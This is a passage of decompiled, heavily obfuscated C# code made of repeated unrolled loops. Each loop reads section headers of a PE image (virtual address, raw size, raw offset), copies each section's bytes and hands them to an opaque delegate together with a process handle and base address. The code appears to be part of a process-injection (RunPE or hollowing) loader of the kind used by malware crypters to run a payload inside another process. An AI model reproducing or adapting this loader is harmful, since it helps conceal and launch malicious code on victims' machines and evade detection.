						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4161] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4161] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2244)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2248)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2252)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4159] = ((*(int*)((byte*)ptr + 2248) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4159] != 0)
					{
						byte[] array186;
						checked
						{
							array186 = new byte[*unchecked((int*)((byte*)ptr + 2248)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2252), array186, 0, array186.Length);
						((byte*)ptr)[4160] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2244))), array186, array186.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4160] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4164] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4164] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2256)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2260)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2264)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4162] = ((*(int*)((byte*)ptr + 2260) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4162] != 0)
					{
						byte[] array187;
						checked
						{
							array187 = new byte[*unchecked((int*)((byte*)ptr + 2260)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2264), array187, 0, array187.Length);
						((byte*)ptr)[4163] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2256))), array187, array187.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4163] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4167] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4167] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2268)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2272)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2276)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4165] = ((*(int*)((byte*)ptr + 2272) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4165] != 0)
					{
						byte[] array188;
						checked
						{
							array188 = new byte[*unchecked((int*)((byte*)ptr + 2272)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2276), array188, 0, array188.Length);
						((byte*)ptr)[4166] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2268))), array188, array188.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4166] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4170] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4170] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2280)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2284)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2288)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4168] = ((*(int*)((byte*)ptr + 2284) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4168] != 0)
					{
						byte[] array189;
						checked
						{
							array189 = new byte[*unchecked((int*)((byte*)ptr + 2284)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2288), array189, 0, array189.Length);
						((byte*)ptr)[4169] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2280))), array189, array189.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4169] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4173] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4173] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2292)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2296)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2300)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4171] = ((*(int*)((byte*)ptr + 2296) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4171] != 0)
					{
						byte[] array190;
						checked
						{
							array190 = new byte[*unchecked((int*)((byte*)ptr + 2296)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2300), array190, 0, array190.Length);
						((byte*)ptr)[4172] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2292))), array190, array190.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4172] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4176] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4176] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2304)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2308)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2312)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4174] = ((*(int*)((byte*)ptr + 2308) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4174] != 0)
					{
						byte[] array191;
						checked
						{
							array191 = new byte[*unchecked((int*)((byte*)ptr + 2308)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2312), array191, 0, array191.Length);
						((byte*)ptr)[4175] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2304))), array191, array191.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4175] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4179] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4179] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2316)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2320)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2324)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4177] = ((*(int*)((byte*)ptr + 2320) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4177] != 0)
					{
						byte[] array192;
						checked
						{
							array192 = new byte[*unchecked((int*)((byte*)ptr + 2320)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2324), array192, 0, array192.Length);
						((byte*)ptr)[4178] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2316))), array192, array192.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4178] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4182] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4182] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2328)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2332)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2336)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4180] = ((*(int*)((byte*)ptr + 2332) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4180] != 0)
					{
						byte[] array193;
						checked
						{
							array193 = new byte[*unchecked((int*)((byte*)ptr + 2332)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2336), array193, 0, array193.Length);
						((byte*)ptr)[4181] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2328))), array193, array193.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4181] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4185] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4185] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2340)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2344)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2348)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4183] = ((*(int*)((byte*)ptr + 2344) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4183] != 0)
					{
						byte[] array194;
						checked
						{
							array194 = new byte[*unchecked((int*)((byte*)ptr + 2344)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2348), array194, 0, array194.Length);
						((byte*)ptr)[4184] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2340))), array194, array194.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4184] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4188] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4188] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2352)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2356)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2360)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4186] = ((*(int*)((byte*)ptr + 2356) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4186] != 0)
					{
						byte[] array195;
						checked
						{
							array195 = new byte[*unchecked((int*)((byte*)ptr + 2356)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2360), array195, 0, array195.Length);
						((byte*)ptr)[4187] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2352))), array195, array195.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4187] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4191] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4191] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2364)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2368)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2372)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4189] = ((*(int*)((byte*)ptr + 2368) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4189] != 0)
					{
						byte[] array196;
						checked
						{
							array196 = new byte[*unchecked((int*)((byte*)ptr + 2368)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2372), array196, 0, array196.Length);
						((byte*)ptr)[4190] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2364))), array196, array196.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4190] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4194] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4194] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2376)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2380)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2384)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4192] = ((*(int*)((byte*)ptr + 2380) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4192] != 0)
					{
						byte[] array197;
						checked
						{
							array197 = new byte[*unchecked((int*)((byte*)ptr + 2380)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2384), array197, 0, array197.Length);
						((byte*)ptr)[4193] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2376))), array197, array197.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4193] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4197] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4197] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2388)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2392)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2396)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4195] = ((*(int*)((byte*)ptr + 2392) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4195] != 0)
					{
						byte[] array198;
						checked
						{
							array198 = new byte[*unchecked((int*)((byte*)ptr + 2392)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2396), array198, 0, array198.Length);
						((byte*)ptr)[4196] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2388))), array198, array198.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4196] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4200] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4200] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2400)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2404)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2408)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4198] = ((*(int*)((byte*)ptr + 2404) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4198] != 0)
					{
						byte[] array199;
						checked
						{
							array199 = new byte[*unchecked((int*)((byte*)ptr + 2404)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2408), array199, 0, array199.Length);
						((byte*)ptr)[4199] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2400))), array199, array199.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4199] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4203] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4203] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2412)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2416)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2420)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4201] = ((*(int*)((byte*)ptr + 2416) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4201] != 0)
					{
						byte[] array200;
						checked
						{
							array200 = new byte[*unchecked((int*)((byte*)ptr + 2416)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2420), array200, 0, array200.Length);
						((byte*)ptr)[4202] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2412))), array200, array200.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4202] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4206] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4206] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2424)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2428)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2432)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4204] = ((*(int*)((byte*)ptr + 2428) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4204] != 0)
					{
						byte[] array201;
						checked
						{
							array201 = new byte[*unchecked((int*)((byte*)ptr + 2428)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2432), array201, 0, array201.Length);
						((byte*)ptr)[4205] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2424))), array201, array201.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4205] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4209] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4209] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2436)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2440)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2444)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4207] = ((*(int*)((byte*)ptr + 2440) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4207] != 0)
					{
						byte[] array202;
						checked
						{
							array202 = new byte[*unchecked((int*)((byte*)ptr + 2440)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2444), array202, 0, array202.Length);
						((byte*)ptr)[4208] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2436))), array202, array202.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4208] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4212] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4212] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2448)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2452)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2456)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4210] = ((*(int*)((byte*)ptr + 2452) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4210] != 0)
					{
						byte[] array203;
						checked
						{
							array203 = new byte[*unchecked((int*)((byte*)ptr + 2452)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2456), array203, 0, array203.Length);
						((byte*)ptr)[4211] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2448))), array203, array203.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4211] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4215] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4215] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2460)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2464)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2468)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4213] = ((*(int*)((byte*)ptr + 2464) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4213] != 0)
					{
						byte[] array204;
						checked
						{
							array204 = new byte[*unchecked((int*)((byte*)ptr + 2464)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2468), array204, 0, array204.Length);
						((byte*)ptr)[4214] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2460))), array204, array204.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4214] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4218] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4218] == 0)
					{
						break;
					}
					checked
					{
